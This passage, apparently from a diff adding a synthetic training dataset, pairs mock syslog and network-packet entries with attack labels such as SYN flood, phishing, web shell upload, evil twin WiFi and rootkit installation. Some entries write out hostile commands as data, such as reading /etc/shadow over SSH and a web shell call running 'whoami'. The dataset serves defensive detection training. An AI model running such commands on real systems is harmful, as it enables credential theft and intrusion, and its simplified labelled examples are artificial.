+          "log_level": "INFO",
+          "component": "auth",
+          "message": "User 'admin' logged in from 192.168.1.100",
+          "related_ip": "192.168.1.100"
+        },
+        {
+          "timestamp": "2023-04-10T23:00:05",
+          "type": "network_packet",
+          "protocol": "SSH",
+          "src_ip": "192.168.1.100",
+          "dst_ip": "server-ip",
+          "src_port": 22,
+          "dst_port": 22,
+          "message": "SSH exec: cat /etc/shadow"
+        },
+        {
+          "timestamp": "2023-04-10T23:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "auditd",
+          "message": "Access to sensitive file /etc/shadow detected",
+          "related_ip": null
+        }
+      ],
+      "output": "Sensitive Data Access / Privilege Abuse"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-11T00:00:00",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "192.168.133.140",
+          "src_port": 10000,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet (high rate)"
+        },
+        {
+          "timestamp": "2023-04-11T00:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "192.168.133.140",
+          "src_port": 10001,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet (high rate)"
+        },
+        {
+          "timestamp": "2023-04-11T00:00:10",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "firewall",
+          "message": "SYN flood detected from 192.168.203.243",
+          "related_ip": "192.168.203.243"
+        }
+      ],
+      "output": "SYN Flood DDoS Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-11T01:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "kernel",
+          "message": "usb 1-2: new high-speed USB device",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-11T01:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "udev",
+          "message": "Unknown USB device detected",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-11T01:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "usb_guard",
+          "message": "Potential USB attack device blocked",
+          "related_ip": null
+        }
+      ],
+      "output": "USB-based Attack (Rubber Ducky)"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-11T02:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "postfix",
+          "message": "from=<attacker@phishing-site.com>",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-11T02:00:05",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "victim-ip",
+          "dst_ip": "phishing-site-ip",
+          "src_port": 12368,
+          "dst_port": 80,
+          "message": "HTTP GET /fake-login.html"
+        },
+        {
+          "timestamp": "2023-04-11T02:00:10",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "victim-ip",
+          "dst_ip": "phishing-site-ip",
+          "src_port": 12369,
+          "dst_port": 80,
+          "message": "HTTP POST /steal-credentials.php"
+        }
+      ],
+      "output": "Phishing Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-11T03:00:00",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "kernel",
+          "message": "segfault at 41414141",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-11T03:00:05",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "vulnerable_app",
+          "message": "Buffer overflow detected",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-11T03:00:10",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "vulnerable-app-ip",
+          "src_port": 12370,
+          "dst_port": 8080,
+          "flags": "PSH,ACK",
+          "length": 500,
+          "message": "TCP PSH,ACK packet (exploit payload)"
+        }
+      ],
+      "output": "Buffer Overflow Exploit"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-11T04:00:00",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.99",
+          "dst_ip": "web-server-ip",
+          "src_port": 12371,
+          "dst_port": 80,
+          "message": "HTTP POST /upload/shell.php"
+        },
+        {
+          "timestamp": "2023-04-11T04:00:05",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.99",
+          "dst_ip": "web-server-ip",
+          "src_port": 12372,
+          "dst_port": 80,
+          "message": "HTTP GET /upload/shell.php?cmd=whoami"
+        },
+        {
+          "timestamp": "2023-04-11T04:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "security",
+          "message": "Web shell detected",
+          "related_ip": null
+        }
+      ],
+      "output": "Web Shell Upload Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-11T05:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "hostapd",
+          "message": "wlan0: STA aa:bb:cc:dd:ee:ff IEEE 802.11: authenticated",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-11T05:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "hostapd",
+          "message": "wlan0: AP-STA-POSSIBLE-PSK-MISMATCH aa:bb:cc:dd:ee:ff",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-11T05:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "wids",
+          "message": "Rogue access point detected: SSID 'CompanyWiFi_Guest' broadcasting on same channel",
+          "related_ip": null
+        }
+      ],
+      "output": "Evil Twin WiFi Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-11T06:00:00",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "aide",
+          "message": "File integrity violation: /bin/ls modified",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-11T06:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "aide",
+          "message": "File integrity violation: /usr/bin/ps modified",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-11T06:00:10",
+          "type": "syslog",
+          "log_level": "CRITICAL",
+          "component": "security",
+          "message": "Rootkit detected",
+          "related_ip": null
+        }
+      ],
+      "output": "Rootkit Installation"
     }
   ]
-} 
+}
